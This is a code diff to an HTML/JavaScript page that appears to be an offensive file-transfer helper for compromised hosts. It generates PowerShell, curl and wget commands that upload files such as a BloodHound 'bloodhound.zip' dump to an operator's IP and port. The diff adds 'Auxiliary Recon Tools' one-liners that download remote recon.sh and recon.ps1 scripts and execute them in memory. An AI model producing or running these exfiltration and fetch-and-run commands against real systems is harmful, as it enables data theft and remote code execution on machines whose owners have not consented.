@@ -177,6 +177,11 @@
 
   <div id="upload-area" class="upload-area">
     <h3>Upload file to remote host</h3>
+   
+    
+
+    
+    
 
     <h3>Command Line</h3>
     <div id="command-line">
@@ -196,17 +201,18 @@
   </div>
 
    <div id="download-area" class="download-area">
-    <h3>Download file to this host</h3>
 
 
+     <h3>Upload file to this host</h3>
     <input type="file" id="file-input" />
-    <button id="download-button">Download</button>
-    <p id="download-status"></p>
-    
+    <button id="upload-button">Upload</button>
+    <p id="upload-status"></p>
+
+        
     <h3>Command Line</h3>
     <div id="command-line">
       <label for="download-file-field">File:</label>
-      <input type="text" id="download-file-field" placeholder="C:\temp\bloodhound.zip" />
+      <input type="text" id="download-file-field" placeholder="C:\temp\bloodhound.zip" value="C:\temp\bloodhound.zip" />
       <datalist id="file-suggestions"></datalist> <!-- Datalist para sugerencias -->
 
       <label for="download-port-field">Port:</label>
@@ -222,6 +228,7 @@
 
 
 
+
 <script>
   /*document.addEventListener('DOMContentLoaded', async () => {
     // Obtener direcciones IP del servidor
@@ -234,6 +241,14 @@
       option.textContent = ip;
       ipSelect.appendChild(option);
     });*/
+
+// Función para copiar al portapapeles
+function copyToClipboard(id) {
+    let text = document.getElementById(id).innerHTML; // Asegurarse de eliminar espacios innecesarios
+    console.log(id)
+    navigator.clipboard.writeText(text)
+}
+
 
 
 
@@ -260,7 +275,13 @@
     }
 
 
+
+
+
+
 /*
+
+
 
   document.getElementById('upload-generate-command').onclick = () => {
     const file = document.getElementById('upload-file-field').value;
@@ -295,6 +316,10 @@
 */
 
 
+
+
+
+
 document.getElementById('upload-generate-command').onclick = () => {
     const file = document.getElementById('upload-file-field').value;
     const port = document.getElementById('upload-port-field').value;
@@ -303,19 +328,24 @@ document.getElementById('upload-generate-command').onclick = () => {
     if (file && port && ip) {
         // Comandos de descarga
         const uploadCommandsWindows = [
-            `(New-Object System.Net.WebClient).UploadFile('http://${ip}:${port}/', 'C:\\Users\\kermi\\Desktop\\${file}')`,
-            `curl.exe -F 'file=@C:\\Users\\kermi\\Desktop\\${file}' http://${ip}:${port}/`,
-            `iwr -uri http://${ip}:${port}/ -Method Post -InFile 'C:\\Users\\kermi\\Desktop\\${file}' -UseBasicParsing`
+            `(New-Object System.Net.WebClient).UploadFile('http://${ip}:${port}/', 'C:\\temp\\${file}')`,
+            `curl.exe -F 'file=@C:\\temp\\Desktop\\${file}' http://${ip}:${port}/`,
+            `iwr -uri http://${ip}:${port}/ -Method Post -InFile 'C:\\temp\\Desktop\\${file}' -UseBasicParsing`
         ];
         const uploadCommandsLinux = [
             `curl -X POST -F 'file=@${file}' http://${ip}:${port}/`,
             `wget --method=POST --header="Content-Type: multipart/form-data" --body-file=${file} http://${ip}:${port}/`
+        ];
+        const auxiliaryReconTools = [
+            `. <(curl http://${ip}:${port}/recon.sh)`,
+            `iex ((New-Object System.Net.WebClient).DownloadString('http://${ip}:${port}/recon.ps1'))`
         ];
 
         // Generar HTML dinámico con IDs únicos
         let outputHTML = '<strong>Upload Commands (Windows):</strong><br>';
         let idCounter = 0; // Para asignar IDs únicos a cada comando
 
+        // Comandos para Windows
         for (const command of uploadCommandsWindows) {
             outputHTML += `
             <div>
@@ -325,6 +355,7 @@ document.getElementById('upload-generate-command').onclick = () => {
             idCounter++;
         }
 
+        // Comandos para Linux
         outputHTML += '<br><strong>Upload Commands (Linux):</strong><br>';
         for (const command of uploadCommandsLinux) {
             outputHTML += `
@@ -335,6 +366,18 @@ document.getElementById('upload-generate-command').onclick = () => {
             idCounter++;
         }
 
+        // Comandos auxiliares
+        outputHTML += `<br><strong>Auxiliary Recon Tools</strong><br>`;
+        for (const command of auxiliaryReconTools) {
+            outputHTML += `
+            <div>
+                <button onclick="copyToClipboard('command-${idCounter}')">Copiar</button>
+                <code id="command-${idCounter}">${command}</code>
+            </div>`;
+            idCounter++;
+        }
+
+        // Mostrar los resultados en el contenedor
         document.getElementById('upload-command-output').innerHTML = outputHTML;
 
     } else {
@@ -342,13 +385,21 @@ document.getElementById('upload-generate-command').onclick = () => {
     }
 };
 
-// Función para copiar al portapapeles
-function copyToClipboard(id) {
-    const text = document.getElementById(id).textContent;
-    navigator.clipboard.writeText(text)
-        .then(() => alert('Comando copiado al portapapeles.'))
-        .catch(err => console.error('Error al copiar al portapapeles:', err));
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -397,6 +448,8 @@ function copyToClipboard(id) {
 
 
 
+
+
 /*
     // Copiar comando al portapapeles
     document.getElementById('copy-command').onclick = () => {
@@ -412,6 +465,8 @@ function copyToClipboard(id) {
   });
 
 */
+
+
 
 
 
@@ -470,6 +525,8 @@ function copyToClipboard(id) {
       document.getElementById('download-area').classList.add('active');
       document.getElementById('upload-tab').classList.remove('active');
     };
+
+
 
 
 
@@ -631,6 +688,7 @@ function copyToClipboard(id) {
 
   document.getElementById('upload-area').style.visibility = 'hidden';
   document.getElementById('download-area').style.visibility = 'hidden';
+
 
 
 </script>
